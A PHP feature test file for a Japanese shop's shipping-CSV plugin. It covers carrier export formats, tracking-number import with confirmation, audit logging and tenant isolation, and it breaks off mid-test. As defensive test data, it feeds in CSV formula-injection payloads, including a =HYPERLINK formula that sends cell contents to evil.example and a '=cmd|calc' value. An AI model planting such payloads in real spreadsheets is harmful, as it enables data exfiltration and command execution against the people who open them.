<?php

declare(strict_types=1);

namespace Tests\Feature\Plugin;

use App\Admin\Models\AuditEvent;
use App\Admin\Services\OperatorAccess;
use App\Core\Event\Models\DomainEvent;
use App\Core\Fulfillment\DeliveryChoice;
use App\Core\Fulfillment\Enums\DeliverySlot;
use App\Core\Fulfillment\Enums\FulfillmentMethod;
use App\Core\Fulfillment\Enums\FulfillmentStatus;
use App\Core\Fulfillment\Models\Fulfillment;
use App\Core\Fulfillment\Services\FulfillmentService;
use App\Core\Inventory\Models\Location;
use App\Core\Inventory\Services\StockService;
use App\Core\Ledger\Enums\PaymentRoute;
use App\Core\Ledger\Services\LedgerService;
use App\Core\Listing\Models\Listing;
use App\Core\Listing\Models\Seller;
use App\Core\Order\Services\SaleOrderService;
use App\Core\Party\Enums\PartyKind;
use App\Core\Party\Models\Party;
use App\Core\Payment\Models\PaymentAttempt;
use App\Core\Plugin\Services\AdminFiles;
use App\Core\Plugin\Services\PluginStates;
use App\Core\Shop\Services\ShopSettingsService;
use App\Core\Transaction\Enums\LineType;
use App\Core\Transaction\Enums\Phase;
use App\Core\Transaction\LineDraft;
use App\Core\Transaction\Models\Transaction;
use App\Core\Transaction\Services\TransactionService;
use App\Storefront\Orders\SendOrderMail;
use EcSugar\PluginShippingCsv\CsvFormat;
use EcSugar\PluginShippingCsv\Models\ExportedMark;
use EcSugar\PluginShippingCsv\Models\ShippingImport;
use EcSugar\PluginShippingCsv\Models\ShippingImportRow;
use Illuminate\Foundation\Testing\DatabaseTruncation;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Queue;
use Illuminate\Testing\TestResponse;
use Symfony\Component\HttpFoundation\Response;
use Tests\Support\OperatorSession;
use Tests\Support\WithTenants;
use Tests\TestCase;

/**
 * App「配送の CSV」。発送を待つ注文を運送会社の形の CSV に書き出し（列・文字コード・届け先の復号・式の無害化・監査）、
 * 送り状番号の CSV を取り込んで、確かめの画面で押すまで注文を変えず、押すと核の発送のサービスで発送にする（合わない行は理由つきで飛ばす・二重にしない）。
 * 使わない店では出ない。店をまたがない。閲覧の段階では書き出しも取り込みも発送もできない
 */
final class ShippingCsvAppTest extends TestCase
{
    use DatabaseTruncation;
    use OperatorSession;
    use WithTenants;

    private const string APP = '/api/tenants/sca/apps/shipping-csv';

    private const array ADDRESS = ['name' => '山田 花子', 'zip' => '1500001', 'prefecture' => '東京都', 'city' => '渋谷区', 'line1' => '神宮前1-2-3', 'line2' => 'ハイツ101', 'phone' => '090-1234-5678'];

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutVite();
        Cache::store()->flush();
        $this->configureAdminHost();
        $this->tenant('sca', '帆布の店');
        $this->inside('sca', function (): void {
            app(ShopSettingsService::class)->setLegal(['items' => [
                ['label' => '販売業者', 'value' => '帆布の店 株式会社'],
                ['label' => '所在地', 'value' => "〒150-0002\n東京都渋谷区渋谷2-1-1"],
                ['label' => '電話番号', 'value' => '03-1234-5678（平日 10〜17 時）'],
            ]], 'test');
        });
    }

    protected function tearDown(): void
    {
        $this->deleteTenants();
        parent::tearDown();
    }

    public function test_an_unused_app_offers_neither_export_nor_import(): void
    {
        $this->enrolledOperator();
        [$order] = $this->order('sca');

        $this->send('GET', self::APP.'/records')->assertNotFound();
        $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2']])->assertNotFound();
        $this->upload('sca', strtoupper($order).",123456789012\n", 'yamato')->assertNotFound();
        $this->assertSame(0, $this->inside('sca', fn () => ShippingImport::query()->count() + ExportedMark::query()->count()));

        // 使うと、一覧の答えに書き出しと取り込みの欄が付く（運送会社の形は 4 つ、取り込みは運送会社を選ぶ）
        $this->enable('sca');
        $list = $this->send('GET', self::APP.'/records')->assertOk();
        $list->assertJsonPath('export.label', 'CSV を書き出す')->assertJsonPath('import.label', 'CSV を取り込む')
            ->assertJsonPath('export.values.format', 'yamato_b2')->assertJsonPath('export.values.target', 'new')->assertJsonPath('form', null);
        $this->assertSame(['yamato_b2', 'sagawa_ehiden', 'japanpost_yupri', 'clickpost'], array_column($list->json('export.fields.0.options'), 0));
        $this->assertSame(['yamato', 'sagawa', 'japanpost', 'other'], array_column($list->json('import.fields.0.options'), 0));
        // ホームのやること（確かめ待ちが 0 件なら出ない）
        $this->send('GET', '/api/tenants/sca/app-pages')->assertOk()->assertJsonFragment(['plugin' => 'shipping-csv', 'title' => '配送の CSV']);
    }

    public function test_each_carrier_format_has_its_columns_and_encoding_with_the_decrypted_addresses(): void
    {
        $this->enable('sca');
        $this->enrolledOperator();
        [$single] = $this->order('sca');
        [$split, $boxes] = $this->order('sca', boxes: 2);
        $this->order('sca', paid: false);
        [$shipped, [$done]] = $this->order('sca');
        $this->inside('sca', fn () => app(SaleOrderService::class)->ship(Transaction::query()->findOrFail($shipped), $done, 'yamato', '999999999999', 'test'));

        foreach (['yamato_b2' => 42, 'sagawa_ehiden' => 50, 'japanpost_yupri' => 27, 'clickpost' => 8] as $format => $columns) {
            $response = $this->send('POST', self::APP.'/export', ['values' => ['format' => $format, 'target' => 'all']])->assertOk();
            $this->assertSame('text/csv; charset=Shift_JIS', $response->headers->get('Content-Type'));
            $this->assertMatchesRegularExpression('/\Aattachment; filename="'.str_replace('_', '-', $format).'-\d{8}-\d{6}\.csv"\z/', (string) $response->headers->get('Content-Disposition'));
            $this->assertStringContainsString('no-store', (string) $response->headers->get('Cache-Control'));
            $body = (string) $response->getContent();
            // Shift_JIS（UTF-8 としては読めない）で、行の終わりは CRLF
            $this->assertFalse(mb_check_encoding($body, 'UTF-8'), $format);
            $this->assertStringEndsWith("\r\n", $body);
            $rows = self::csv($body);
            // 項目名の行 + 発送を待つ箱 3 つ（入金の前・発送済みの注文は入らない）。どの行も項目名と同じ列の数
            $this->assertCount(4, $rows, $format);

            foreach ($rows as $row) {
                $this->assertCount($columns, $row, $format);
            }

            $text = implode("\n", array_map(static fn (array $r): string => implode(',', $r), $rows));
            $this->assertStringContainsString('山田 花子', $text, $format);
            $this->assertStringContainsString('150-0001', $text, $format);
            $this->assertStringNotContainsString(strtoupper($shipped), $text, $format);
        }

        // B2 クラウド: お客様管理番号は注文番号（箱が 2 つの注文は -1・-2）。届け先・ご依頼主（特商法の表記から）・品名・請求の欄
        $b2 = self::csv((string) $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'all']])->getContent());
        $this->assertSame(['お客様管理番号', '送り状種類', 'クール区分', '伝票番号', '出荷予定日'], array_slice($b2[0], 0, 5));
        $this->assertSame([strtoupper($single), strtoupper($split).'-1', strtoupper($split).'-2'], array_column(array_slice($b2, 1), 0));
        $first = array_combine($b2[0], $b2[1]);
        $this->assertSame('0', $first['送り状種類']);
        $this->assertSame(now('Asia/Tokyo')->format('Y/m/d'), $first['出荷予定日']);
        $this->assertSame('090-1234-5678', $first['お届け先電話番号']);
        $this->assertSame('東京都渋谷区神宮前1-2-3', $first['お届け先住所']);
        $this->assertSame('ハイツ101', $first['お届け先アパートマンション名']);
        $this->assertSame('山田 花子', $first['お届け先名']);
        $this->assertSame('帆布の店', $first['ご依頼主名']);
        $this->assertSame('150-0002', $first['ご依頼主郵便番号']);
        $this->assertSame('東京都渋谷区渋谷2-1-1', $first['ご依頼主住所']);
        $this->assertSame('03-1234-5678', $first['ご依頼主電話番号']);
        $this->assertSame('帆布のトートバッグ', $first['品名１']);
        $this->assertSame('01', $first['運賃管理番号']);
        $this->assertSame('', $first['ｺﾚｸﾄ代金引換額（税込)']);

        // クリックポスト: 注文番号の欄は無く、住所を 4 行に分ける
        $click = self::csv((string) $this->send('POST', self::APP.'/export', ['values' => ['format' => 'clickpost', 'target' => 'all']])->getContent());
        $this->assertSame(['150-0001', '山田 花子', '様', '東京都渋谷区', '神宮前1-2-3', 'ハイツ101', '', '帆布のトートバッグ'], $click[1]);

        // 書き出した箱には印が付き、「まだ書き出していない」では出ない。注文番号を指定すると、その箱だけ
        $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'new']])->assertUnprocessable()->assertJsonValidationErrors(['values.target']);
        $only = self::csv((string) $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'numbers', 'numbers' => strtolower($split)."-2\n"]])->assertOk()->getContent());
        $this->assertSame([strtoupper($split).'-2'], array_column(array_slice($only, 1), 0));
        // 番号だけで箱が 2 つの注文は、両方の箱
        $both = self::csv((string) $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'numbers', 'numbers' => strtoupper($split)]])->getContent());
        $this->assertCount(3, $both);
        // 発送済み・知らない注文番号は断る（どれかは書かない）
        $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'numbers', 'numbers' => strtoupper($shipped)]])
            ->assertUnprocessable()->assertJsonValidationErrors(['values.numbers']);
        $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'numbers', 'numbers' => 'not-an-order']])
            ->assertUnprocessable()->assertJsonValidationErrors(['values.numbers']);
        $this->send('POST', self::APP.'/export', ['values' => ['format' => 'fedex', 'target' => 'all']])->assertUnprocessable()->assertJsonValidationErrors(['values.format']);
        $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'all', 'ship_date' => '2000-01-01']])->assertUnprocessable()->assertJsonValidationErrors(['values.ship_date']);
        $this->inside('sca', function () use ($boxes): void {
            $this->assertSame(3, ExportedMark::query()->count());
            $this->assertGreaterThan(1, ExportedMark::query()->findOrFail($boxes[1])->times);
        });
    }

    public function test_the_chosen_delivery_date_and_slot_go_into_each_carriers_columns(): void
    {
        $this->enable('sca');
        $this->enrolledOperator();
        [$both] = $this->order('sca', delivery: new DeliveryChoice('2026-12-02', DeliverySlot::From19To21));
        [$morning] = $this->order('sca', delivery: new DeliveryChoice(null, DeliverySlot::Morning));
        [$dateOnly] = $this->order('sca', delivery: new DeliveryChoice('2027-01-04', null));
        [$none] = $this->order('sca');
        // 注文番号 => [日, 時間帯]（ADR 0059。各社の区分の値。指定なしは空）
        $expected = [
            'yamato_b2' => ['お客様管理番号', 'お届け予定日', '配達時間帯', [$both => ['2026/12/02', '1921'], $morning => ['', '0812'], $dateOnly => ['2027/01/04', ''], $none => ['', '']]],
            'sagawa_ehiden' => ['お客様管理番号', '配達日', '配達指定時間帯', [$both => ['20261202', '19'], $morning => ['', '01'], $dateOnly => ['20270104', ''], $none => ['', '']]],
            'japanpost_yupri' => ['お客様側管理番号', '配達希望日', '配達時間帯', [$both => ['2026/12/02', '57'], $morning => ['', '51'], $dateOnly => ['2027/01/04', ''], $none => ['', '']]],
        ];

        foreach ($expected as $format => [$number, $dateColumn, $slotColumn, $orders]) {
            $rows = self::csv((string) $this->send('POST', self::APP.'/export', ['values' => ['format' => $format, 'target' => 'all']])->assertOk()->getContent());
            $found = [];

            foreach (array_slice($rows, 1) as $row) {
                $cells = array_combine($rows[0], $row);
                $found[strtolower($cells[$number])] = [$cells[$dateColumn], $cells[$slotColumn]];
            }

            $this->assertSame($orders, $found, $format);
        }

        // クリックポストは郵便受けへの配達で指定が無い（列も無い）
        $click = self::csv((string) $this->send('POST', self::APP.'/export', ['values' => ['format' => 'clickpost', 'target' => 'all']])->getContent());
        $this->assertCount(8, $click[1]);
        $this->assertStringNotContainsString('2026', implode(',', array_merge(...$click)));
        // 区分の値の写像は全部の時間帯に答える（足した時間帯を忘れない）
        foreach ([CsvFormat::YamatoB2, CsvFormat::SagawaEhiden, CsvFormat::JapanPostYupri] as $carrier) {
            $codes = array_map(static fn (DeliverySlot $slot): string => $carrier->slotCode($slot), DeliverySlot::cases());
            $this->assertSame(count(DeliverySlot::cases()), count(array_unique(array_filter($codes))), $carrier->value);
        }
    }

    public function test_export_makes_formula_cells_harmless_and_is_audited_without_the_contents(): void
    {
        $this->enable('sca');
        [$owner] = $this->enrolledOperator();
        $this->order('sca', address: ['name' => '=HYPERLINK("http://evil.example/?"&A1,"見る")', 'line2' => "@SUM(1+1)\r\n2 階", 'company' => '+81 会社', 'phone' => '-0901234']);

        $body = (string) $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'all']])->assertOk()->getContent();
        $row = array_combine(...array_slice(self::csv($body), 0, 2));
        // 式として読まれる頭（= + - @）には ' を付け、改行は空白に替える。引用符は CSV の決まりで包む
        $this->assertSame('\'=HYPERLINK("http://evil.example/?"&A1,"見る")', $row['お届け先名']);
        $this->assertSame("'@SUM(1+1)  2 階", $row['お届け先アパートマンション名']);
        $this->assertSame("'+81 会社", $row['お届け先会社・部門１']);
        $this->assertSame("'-0901234", $row['お届け先電話番号']);
        $this->assertStringNotContainsString("\r\n2 階", mb_convert_encoding($body, 'UTF-8', 'CP932'));
        $this->assertSame('"a""b,c"', AdminFiles::cell('a"b,c'));
        $this->assertSame("' =1", AdminFiles::cell(' =1'));
        $this->assertSame('東京都', AdminFiles::cell('東京都'));

        // 中央の監査ログに「誰が・どの App・何件」だけ。届け先は残さない。店の記録にも件数と形だけ
        $audit = AuditEvent::query()->where('type', 'operator.app_file_exported')->where('operator_id', $owner->id)->sole();
        $this->assertSame($owner->id, $audit->operator_id);
        $this->assertSame('sca', $audit->tenant_id);
        $this->assertEqualsCanonicalizing(['plugin', 'file', 'rows'], array_keys($audit->data));
        $this->assertSame(1, $audit->data['rows']);
        $event = $this->inside('sca', fn () => DomainEvent::query()->where('type', 'shipping_csv.exported')->sole());
        $this->assertSame(['format' => 'yamato_b2', 'target' => 'all', 'parcels' => 1], $event->payload);
        $this->assertSame($owner->actor(), $event->actor);

        foreach ([json_encode($audit->data, JSON_UNESCAPED_UNICODE | JSON_THROW_ON_ERROR), json_encode($event->payload, JSON_UNESCAPED_UNICODE | JSON_THROW_ON_ERROR)] as $kept) {
            $this->assertStringNotContainsString('HYPERLINK', $kept);
            $this->assertStringNotContainsString('渋谷', $kept);
        }
    }

    public function test_import_changes_nothing_until_confirmed_then_ships_through_the_core_and_skips_rows_with_reasons(): void
    {
        Queue::fake();
        $this->enable('sca');
        [$owner] = $this->enrolledOperator();
        [$a, [$aBox]] = $this->order('sca');
        [$b, $bBoxes] = $this->order('sca', boxes: 2);
        [$unpaid] = $this->order('sca', paid: false);
        [$sent, [$sentBox]] = $this->order('sca');
        $this->inside('sca', fn () => app(SaleOrderService::class)->ship(Transaction::query()->findOrFail($sent), $sentBox, 'yamato', '111111111111', 'test'));
        Queue::fake();

        $csv = implode("\r\n", [
            '注文番号,送り状番号',
            strtolower($a).',1234-5678-9012',            // 発送にする（小文字の番号も読む）
            strtoupper($b).'-2,２２２２３３３３４４４４',     // 箱の番号つき。全角の数字は半角に
            strtoupper($b).',555566667777',               // 箱が 2 つで番号だけ（どの箱か決められない）
            strtoupper($a).',1234-5678-9013',             // 同じ箱がもう 1 行
            strtoupper($unpaid).',666677778888',          // 入金の前
            strtoupper($sent).',777788889999',            // もう発送済み
            '01ARZ3NDEKTSV4RRFFQ69G5FAV,888899990000',    // この店に無い注文
            'うちの注文,123',                              // 番号の形が違う
            strtoupper($b).'-1,',                         // 送り状番号が無い
            strtoupper($b).'-1,=cmd|calc',                // 送り状番号の形が違う
            '',
        ]);
        $id = $this->upload('sca', $csv, 'yamato')->assertCreated()->json('id');

        // 確かめの前は、注文は何も変わらない（発送のメールも出ない）
        $this->inside('sca', function () use ($aBox, $bBoxes): void {
            $this->assertSame([FulfillmentStatus::Pending], Fulfillment::query()->whereKey([$aBox, ...$bBoxes])->pluck('status')->unique()->values()->all());
            $this->assertSame(0, DomainEvent::query()->where('type', 'fulfillment.shipped')->where('actor', '!=', 'test')->count());
        });
        Queue::assertNotPushed(SendOrderMail::class);

        // 確かめの画面: 発送にする 2 件と、飛ばす行（理由）。送り状番号は末尾の 4 文字だけ、届け先は出さない
        $record = $this->send('GET', self::APP.'/records/'.$id)->assertOk();
        $record->assertJsonPath('record.title', fn ($t) => str_starts_with($t, '取り込み '))
            ->assertJsonPath('record.actions.0.key', 'apply')->assertJsonPath('record.actions.0.label', '2 件を発送にする')->assertJsonPath('record.actions.1.key', 'discard');
        $go = $record->json('record.tables.0.rows');
        $this->assertSame([2, 3], array_map(static fn ($r) => $r['cells']['line'], $go));
        $this->assertSame(['…9012', '…4444'], array_map(static fn ($r) => $r['cells']['tracking'], $go));
        $this->assertSame(['kind' => 'transaction', 'id' => $a], array_intersect_key($go[0]['cells']['order'], ['kind' => 1, 'id' => 1]));
        $reasons = array_map(static fn ($r) => [$r['cells']['line'], $r['cells']['reason']], $record->json('record.tables.1.rows'));
        $this->assertSame([
            [4, '荷物が 2 つ以上に分かれる注文です（書き出した CSV の番号〔末尾の -1・-2〕で取り込んでください）'],
            [5, '前の行と同じ荷物です'],
            [6, 'まだ入金されていない注文です'],
            [7, 'すでに発送済みです'],
            [8, 'この注文番号の注文が見つかりません'],
            [9, '注文番号が正しくありません'],
            [10, '送り状番号がありません'],
            [11, '送り状番号が正しくありません（英数字とハイフンで 64 文字まで）'],
        ], $reasons);
        $this->assertStringNotContainsString('山田', json_encode($record->json(), JSON_UNESCAPED_UNICODE | JSON_THROW_ON_ERROR));
        $this->assertStringNotContainsString('1234-5678-9012', json_encode($record->json(), JSON_THROW_ON_ERROR));
        // 送り状番号は表にも暗号化して置く
        $this->inside('sca', function () use ($id): void {
            $raw = DB::table('shipping_csv_import_rows')->where('import_id', $id)->where('line', 2)->value('tracking_number');
            $this->assertIsString($raw);
            $this->assertStringNotContainsString('1234-5678-9012', $raw);
            $this->assertSame('1234-5678-9012', ShippingImportRow::query()->where('import_id', $id)->where('line', 2)->sole()->tracking_number);
        });
        // ホームのやることに確かめ待ち
        $this->send('GET', self::APP.'/records')->assertJsonPath('filters.0.count', 1)->assertJsonPath('rows.0.id', $id);

        // 発送にする: 核の発送のサービスを通り、送り状番号と運送会社が付き、取引は受渡へ。発送の知らせのメールも今の仕組みで
        $this->send('POST', self::APP.'/records/'.$id.'/actions/apply')->assertOk()
            ->assertJsonPath('record.facts.0.value.label', '発送にした')->assertJsonPath('record.actions', []);
        $this->inside('sca', function () use ($a, $aBox, $bBoxes, $owner): void {
            $shipped = Fulfillment::query()->findOrFail($aBox);
            $this->assertSame([FulfillmentStatus::Shipped, 'yamato', '1234-5678-9012'], [$shipped->status, $shipped->carrier, $shipped->tracking_number]);
            $this->assertSame('222233334444', Fulfillment::query()->findOrFail($bBoxes[1])->tracking_number);
            $this->assertSame(FulfillmentStatus::Pending, Fulfillment::query()->findOrFail($bBoxes[0])->status);
            $this->assertSame(Phase::Fulfillment, Transaction::query()->findOrFail($a)->phase);
            $this->assertSame(2, DomainEvent::query()->where('type', 'fulfillment.shipped')->where('actor', $owner->actor())->count());
            $applied = DomainEvent::query()->where('type', 'shipping_csv.applied')->sole();
            $this->assertSame(['carrier' => 'yamato', 'shipped' => 2, 'skipped' => 8], $applied->payload);
        });
        Queue::assertPushed(SendOrderMail::class, 2);
        Queue::assertPushed(SendOrderMail::class, fn (SendOrderMail $job): bool => $job->kind === 'order_shipped' && $job->fulfillmentId === $aBox);

        // 押し直し・古い画面からの発送・取りやめは 404（もう出ていない操作）。二重に発送しない
        $this->send('POST', self::APP.'/records/'.$id.'/actions/apply')->assertNotFound();
        $this->send('POST', self::APP.'/records/'.$id.'/actions/discard')->assertNotFound();

        // 同じファイルをもう一度: 新しい取り込みになるが、発送済みの箱は飛ばし、「同じファイル」と出る。発送にするものが無いので押せない
        $again = $this->upload('sca', $csv, 'yamato')->assertCreated()->json('id');
        $second = $this->send('GET', self::APP.'/records/'.$again)->assertOk();
        // 事実の 6 番目（0 から 5）が「同じファイル」
        $second->assertJsonPath('record.facts.5.label', '同じファイル');
        $this->assertStringContainsString('取り込んだファイルと同じです', (string) $second->json('record.facts.5.value'));
        $second->assertJsonPath('record.actions.0.key', 'discard')->assertJsonCount(1, 'record.actions')->assertJsonPath('record.tables.0.title', '発送にしない行');
        $this->assertSame([[2, 'すでに発送済みです'], [3, 'すでに発送済みです']], array_slice(array_map(static fn ($r) => [$r['cells']['line'], $r['cells']['reason']], $second->json('record.tables.0.rows')), 0, 2));
        $this->inside('sca', fn () => $this->assertSame(0, ShippingImport::query()->findOrFail($again)->ready_count));
        Queue::assertPushed(SendOrderMail::class, 2);

        // 取りやめる: 注文は変えない
        $this->send('POST', self::APP.'/records/'.$again.'/actions/discard')->assertOk()->assertJsonPath('record.facts.0.value.label', '取りやめた');
        $this->inside('sca', fn () => $this->assertSame(1, DomainEvent::query()->where('type', 'shipping_csv.discarded')->count()));
    }

    public function test_rows_whose_order_changed_after_the_preview_are_skipped_when_applied(): void
    {
        Queue::fake();
        $this->enable('sca');
        $this->enrolledOperator();
        [$a, [$aBox]] = $this->order('sca');
        [$b, [$bBox]] = $this->order('sca');
        $id = $this->upload('sca', strtoupper($a).",100000000001\n".strtoupper($b).",100000000002\n", 'sagawa')->assertCreated()->json('id');

        // 確かめの間に、ほかの人が注文の画面で a を発送にし、b を取り消した
        $this->inside('sca', function () use ($a, $aBox, $b): void {
            app(SaleOrderService::class)->ship(Transaction::query()->findOrFail($a), $aBox, 'yamato', '900000000000', 'test');
            app(TransactionService::class)->transition(Transaction::query()->findOrFail($b), Phase::Cancel, 'test');
        });

        $this->send('POST', self::APP.'/records/'.$id.'/actions/apply')->assertOk();
        $this->inside('sca', function () use ($id, $aBox, $bBox): void {
            // 先に付いた送り状番号を上書きしない。取り消した注文は発送にしない
            $this->assertSame('900000000000', Fulfillment::query()->findOrFail($aBox)->tracking_number);
            $this->assertSame(FulfillmentStatus::Pending, Fulfillment::query()->findOrFail($bBox)->status);
            $import = ShippingImport::query()->findOrFail($id);
            $this->assertSame(['applied', 0, 2], [$import->status, $import->shipped_count, $import->skipped_count]);
            $this->assertSame(['already_shipped', 'cancelled'], ShippingImportRow::query()->where('import_id', $id)->orderBy('line')->pluck('reason')->all());
        });
    }

    public function test_boxes_without_a_destination_yet_are_neither_exported_nor_shipped_by_import(): void
    {
        Queue::fake();
        $this->enable('sca');
        $this->enrolledOperator();
        [$normal] = $this->order('sca');
        // 贈り物の受け取り待ち（ADR 0055）: お届け先が null の受渡と、空の受渡
        [$gift, [$giftBox]] = $this->order('sca', address: null);
        [$empty, [$emptyBox]] = $this->order('sca', address: null);
        $this->inside('sca', fn () => DB::table('fulfillments')->where('id', $emptyBox)->update(['address' => Fulfillment::query()->findOrFail($emptyBox)->forceFill(['address' => []])->getAttributes()['address']]));
        $this->inside('sca', fn () => $this->assertSame([], Fulfillment::query()->findOrFail($emptyBox)->address));

        // 書き出し: お届け先の無い箱は入らない。注文番号で指定しても見つからない扱い
        $rows = self::csv((string) $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'all']])->assertOk()->getContent());
        $this->assertSame([strtoupper($normal)], array_column(array_slice($rows, 1), 0));
        $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'numbers', 'numbers' => strtoupper($gift)]])
            ->assertUnprocessable()->assertJsonValidationErrors(['values.numbers']);
        $this->inside('sca', fn () => $this->assertSame(0, ExportedMark::query()->whereKey([$giftBox, $emptyBox])->count()));

        // 取り込み: 理由つきで飛ばし、発送にしない
        $id = $this->upload('sca', strtoupper($gift).",123456789012\n".strtoupper($empty).",223456789012\n".strtoupper($normal).",323456789012\n", 'yamato')->assertCreated()->json('id');
        $reasons = array_map(static fn ($r) => [$r['cells']['line'], $r['cells']['reason']], $this->send('GET', self::APP.'/records/'.$id)->assertOk()->json('record.tables.1.rows'));
        $this->assertSame([[1, 'お届け先がまだ決まっていません（贈り物の受け取り待ち）'], [2, 'お届け先がまだ決まっていません（贈り物の受け取り待ち）']], $reasons);
        $this->send('POST', self::APP.'/records/'.$id.'/actions/apply')->assertOk()->assertJsonPath('record.facts.3.value', 1);
        $this->inside('sca', function () use ($giftBox, $emptyBox): void {
            $this->assertSame([FulfillmentStatus::Pending], Fulfillment::query()->whereKey([$giftBox, $emptyBox])->pluck('status')->unique()->values()->all());
        });
    }

    public function test_unpaid_cash_on_delivery_orders_are_left_out_of_the_csv_with_a_note_and_not_shipped_by_import(): void
    {
        Queue::fake();
        $this->enable('sca');
        $this->enrolledOperator();
        [$normal] = $this->order('sca');
        // 代金引換でまだ払われていない注文（ADR 0074）と、入金を確かめた代引きの注文
        [$cod, [$codBox]] = $this->codOrder();
        [$paidCod] = $this->codOrder(paid: true);

        // 書き出しの欄に、外した代引きの数と運送会社の画面で作る案内
        $help = array_column((array) $this->send('GET', self::APP.'/records')->assertOk()->json('export.fields'), 'help', 'key')['target'] ?? '';
        $this->assertStringContainsString('代引きの注文 1 件は、運送会社の画面で代引きの送り状を作ってください', (string) $help);

        // 書き出し: 未入金の代引きは入らない（この CSV の送り状は発払い）。入金を確かめた代引きは入る。番号で指定しても見つからない扱いで理由つき
        $rows = self::csv((string) $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'all']])->assertOk()->getContent());
        $this->assertEqualsCanonicalizing([strtoupper($normal), strtoupper($paidCod)], array_column(array_slice($rows, 1), 0));
        $this->send('POST', self::APP.'/export', ['values' => ['format' => 'yamato_b2', 'target' => 'numbers', 'numbers' => strtoupper($cod)]])
            ->assertUnprocessable()->assertJsonValidationErrors(['values.numbers'])
            ->assertJsonFragment(['発送待ちの注文の中に見つからない注文番号があります: '.strtoupper($cod).'（代引きの注文 1 件は入れていません。運送会社の画面で代引きの送り状を作ってください）']);
        $this->inside('sca', fn () => $this->assertSame(0, ExportedMark::query()->whereKey($codBox)->count()));

        // 取り込み: 理由つきで飛ばし、発送にしない
        $id = $this->upload('sca', strtoupper($cod).",123456789012\n", 'yamato')->assertCreated()->json('id');
        $reasons = array_map(static fn ($r) => [$r['cells']['line'], $r['cells']['reason']], $this->send('GET', self::APP.'/records/'.$id)->assertOk()->json('record.tables.0.rows'));
        $this->assertSame([[1, '代金引換の注文です（運送会社の画面で代引きの送り状を作り、注文の画面で発送を登録してください）']], $reasons);
        $this->inside('sca', fn () => $this->assertSame(FulfillmentStatus::Pending, Fulfillment::query()->findOrFail($codBox)->status));
    }

    public function test_carrier_files_in_shift_jis_with_their_own_header_names_are_read(): void
    {
        $this->enable('sca');
        $this->enrolledOperator();
        [$a] = $this->order('sca');
        [$b] = $this->order('sca');
        // B2 クラウドの発行済みのデータの形（項目名の行・ほかの列つき・Shift_JIS）
        $b2 = mb_convert_encoding("お客様管理番号,送り状種類,伝票番号,お届け先名\r\n".strtoupper($a).",0,123456789012,山田 花子\r\n\"".strtoupper($b)."\",0,\"223456789012\",\"鈴木, 一郎\"\r\n", 'CP932', 'UTF-8');
        $id = $this->upload('sca', $b2, 'yamato')->assertCreated()->json('id');
        $this->inside('sca', function () use ($id): void {
            $this->assertSame(['ready', 'ready'], ShippingImportRow::query()->where('import_id', $id)->orderBy('line')->pluck('status')->all());
            $this->assertSame(['123456789012', '223456789012'], ShippingImportRow::query()->where('import_id', $id)->orderBy('line')->get()->pluck('tracking_number')->all());
        });

        // e飛伝の形の項目名（お問合せ送り状No.）と、BOM つきの UTF-8
        $ehiden = "\xEF\xBB\xBFお客様管理番号,お問合せ送り状No.\n".strtoupper($a).",3333-4444-5555\n";
        $other = $this->upload('sca', $ehiden, 'sagawa')->assertCreated()->json('id');
        $this->inside('sca', fn () => $this->assertSame('3333-4444-5555', ShippingImportRow::query()->where('import_id', $other)->sole()->tracking_number));
    }

    public function test_broken_files_and_wrong_values_are_refused_before_anything_is_written(): void
    {
        $this->enable('sca');
        $this->enrolledOperator();
        [$a] = $this->order('sca');

        $this->upload('sca', '', 'yamato')->assertUnprocessable()->assertJsonValidationErrors(['file']);
        $this->upload('sca', "注文番号,送り状番号\n", 'yamato')->assertUnprocessable()->assertJsonValidationErrors(['file']);
        $this->upload('sca', "a\0b,1\n", 'yamato')->assertUnprocessable()->assertJsonValidationErrors(['file']);
        $this->upload('sca', str_repeat("x,1\n", 1002), 'yamato')->assertUnprocessable()->assertJsonValidationErrors(['file']);
        $this->upload('sca', str_repeat('x', AdminFiles::IMPORT_MAX_BYTES + 1), 'yamato')->assertUnprocessable()->assertJsonValidationErrors(['file']);
        $this->upload('sca', strtoupper($a).",1\n", 'kuroneko')->assertUnprocessable()->assertJsonValidationErrors(['values.carrier']);
        $this->upload('sca', strtoupper($a).",1\n", null)->assertUnprocessable()->assertJsonValidationErrors(['values.carrier']);
        $this->send('POST', self::APP.'/imports', ['values' => ['carrier' => 'yamato']])->assertUnprocessable()->assertJsonValidationErrors(['file']);
        $this->assertSame(0, $this->inside('sca', fn () => ShippingImport::query()->count() + DomainEvent::query()->where('type', 'like', 'shipping_csv.%')->count()));
    }

    public function test_the_read_level_and_another_shop_cannot_export_import_or_ship(): void
    {
        $this->tenant('scb');
        $this->enable('sca');
        $this->enable('scb');
        [$owner, $key] = $this->enrolledOperator();
        [$a, [$aBox]] = $this->order('sca');
        $id = $this->upload('sca', strtoupper($a).",123456789012\n", 'yamato')->assertCreated()->json('id');

        // B の店の経路から A の店の取り込みは無いのと同じ。B の店に A の注文番号を取り込んでも、見つからない
        $other = '/api/tenants/scb/apps/shipping-csv';
        $this->send('GET', "{$other}/records/{$id}")->assertNotFound();
        $this->send('POST', "{$other}/records/{$id}/actions/apply")->assertNotFound();
        $theirs = $this->upload('scb', strtoupper($a).",123456789012\n", 'yamato')->assertCreated()->json('id');
        $this->inside('scb', fn () => $this->assertSame('not_found', ShippingImportRow::query()->where('import_id', $theirs)->sole()->reason));
        $this->send('POST', "{$other}/export", ['values' => ['format' => 'yamato_b2', 'target' => 'all']])->assertUnprocessable();

